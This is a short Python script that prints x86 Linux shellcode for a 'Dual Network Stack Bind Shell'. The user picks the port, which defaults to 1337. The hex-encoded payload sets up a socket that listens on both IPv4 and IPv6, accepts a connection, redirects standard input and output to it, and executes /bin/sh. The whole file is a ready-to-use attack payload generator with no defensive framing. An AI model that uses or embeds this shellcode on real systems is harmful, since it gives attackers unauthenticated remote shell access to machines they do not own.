#!/usr/bin/env python3

from argparse import ArgumentParser
import sys

sc = ("\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x0a\\x89\\xe1\\x6a\\x66\\x58\\x43\\xcd"
      "\\x80\\x96\\x31\\xc0\\x50\\x89\\xe2\\x6a\\x02\\x52\\x6a\\x1a\\x6a\\x29"
      "\\x89\\xe1\\xb0\\x66\\xb3\\x0e\\xcd\\x80\\x31\\xd2\\x52\\x66\\x68{port}"
      "\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3\\x02\\xb0"
      "\\x66\\xcd\\x80\\x31\\xc0\\x50\\x50\\x50\\x50\\x50\\x66\\x68{port}"
      "\\x66\\x6a\\x0a\\x89\\xe1\\x6a\\x1c\\x51\\x56\\x89\\xe1\\xb3\\x02\\xb0"
      "\\x66\\xcd\\x80\\x6a\\x02\\x56\\x89\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80"
      "\\x31\\xdb\\x53\\x53\\x56\\x89\\xe1\\xb3\\x05\\xb0\\x66\\xcd\\x80\\x93"
      "\\x29\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xd2\\x52"
      "\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53"
      "\\x89\\xe1\\xb0\\x0b\\xcd\\x80")

if __name__ == '__main__':
    parser = ArgumentParser(description=("Dual Network Stack Bind Shell "
            "Generator"))
    parser.add_argument('port', type=int, nargs='?', default=1337,
            help='The port to bind to (default 1337)')
    args = parser.parse_args()

    if args.port < 1 or args.port > 65535:
        print('Invalid port. Please select a port between 1 and 65535')
        sys.exit(1)

    port = format(args.port, '04x')
    port = "\\x{b}\\x{a}".format(a=str(port[2:4]), b=str(port[0:2]))

    if '\\x00' in port:
        print('[!] Warning, port contains null value')

    print('Shellcode:')
    print(sc.format(port=port))
